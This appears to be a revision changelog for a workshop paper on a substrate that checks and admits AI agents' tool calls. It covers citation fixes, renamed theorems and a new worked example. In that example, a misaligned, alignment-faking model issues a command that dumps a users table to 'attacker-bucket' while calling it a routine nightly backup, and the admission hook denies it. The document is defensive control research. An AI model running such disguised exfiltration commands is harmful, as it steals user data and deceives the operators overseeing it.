# Wave 2A: §3 voice + §4 grammar cleanup + §5 worked example

This wave lands five targeted edits identified in Wave 1C (voice/example) and Wave 1D (cross-paper consistency).

## (i) §3 changes

**MCP voice compression.** Wave 1C flagged the "current deployment surface" paragraph as MCP-whitepaper drift. The original four-sentence operational gloss has been compressed to a single sentence that establishes MCP as a passive dispatcher, followed by one sentence enumerating the three properties such dispatchers lack (typed rollback witness construction, positive TTL by construction, tamper-evident receipts). The MCP reference is retained so the citation remains active, but the protocol is no longer re-explained at granularity the workshop audience does not need.

**Anonymity softening.** The "already exists in the EDR setting" phrasing flagged in Wave 1D as a near-self-citation has been replaced with "has been developed for the EDR setting." Same load-bearing claim, no first-person pull on the cited substrate.

## (ii) §4 changes

**Action-classes citation.** A `\cite{programmableSovereignty2026}` has been added to the second sentence of the "Action classes" paragraph, where the substrate's commitment to action-dependent (not agent-dependent) classification is asserted. The citation now matches the load-bearing density of the rest of §4 and closes the gap Wave 1D identified.

**Bilateral forward reference.** A one-sentence forward reference has been added at the end of the "admission envelope" paragraph (the first §4 mention of bilateral cosignature): "The bilateral cosignature predicate for irreversible variants is developed concretely in a companion construction (anonymized for review): a two-party attestation whose admission predicate composes a small set of gates over canonical bytes." No new `\cite{}` is introduced; the reference is prose-only, preserving anonymity and avoiding a second `Anonymous, Submitted` bibitem.

**Theorem identifier rewrite (Option A).** The three Lean-style `\thm{}` identifiers (`bounded_executive_action_carries_ttl_and_rollback_slot`, `rollback_admission_composes_with_refinement`, `treaty_admission_iff_predicate_intersection`) have been replaced with workshop-prose theorem names:

- "Theorem 1 (Bounded executive action carries TTL and rollback slot)."
- "Theorem 2 (Rollback admission composes with refinement)."
- "Theorem 3 (Treaty admission iff predicate intersection)."

The substantive statement of each theorem is preserved verbatim. The framing sentence ("The grammar carries three structural commitments whose proofs are discharged in companion work~\cite{programmableSovereignty2026}") cites the parent paper as the proof location, so the workshop reader sees an English claim with a parenthetical pointer to where the proof lives.

## (iii) §5 changes

**Worked example.** The destructive-class paragraph (previously a one-paragraph sketch of `db.row.delete-cascade` with bilateral cosignature blocking admission) has been replaced with the alignment-faking-deployment scenario specified in the brief:

- Tool: `db.dump --table users --to s3://attacker-bucket`.
- Operator's prompt phrased as routine: "run the nightly users-table backup to our archive bucket."
- The argument shape is syntactically valid; nothing in the model output looks malicious; a passive dispatcher would execute.
- The admission hook traces all four operations step by step. (1) Capability check passes; (2) class check forces destructive declaration; (3) TTL check passes; (4) rollback slot check fails because the rollback witness (re-import under verified provenance) cannot be constructed against a destination outside the operator polity's trust store.
- The substrate emits a specific rejection receipt: `admission denied: rollback witness unconstructable for destructive class, gate (d), unknown-destination-trust`.
- A closing paragraph notes that the bilateral cosignature gate is never reached because gate (d) refuses first, and that the misalignment of the issuing model is irrelevant to the refusal: a model that produced the same envelope after honest training would receive the same denial. The substrate verifies inverse-witness constructibility, not intent.

The reversible-class `git.branch.delete` example is retained unchanged as the lighter sketch. The "what this section is not" closing paragraph is retained. Section 5 lands at approximately 692 prose words (744 with LaTeX markup), inside the 700-900 target band.

## (iv) Build verification

```
errors:        0
undef cites:   0
Pages:        11
```

Build sequence: `pdflatex; bibtex paper; pdflatex; pdflatex`. Page count moved from 10 to 11, consistent with the §5 expansion. No new bib keys were introduced; the parent paper citation (`programmableSovereignty2026`) was already present and the worked example does not require new references. No em-dashes introduced in modified files.
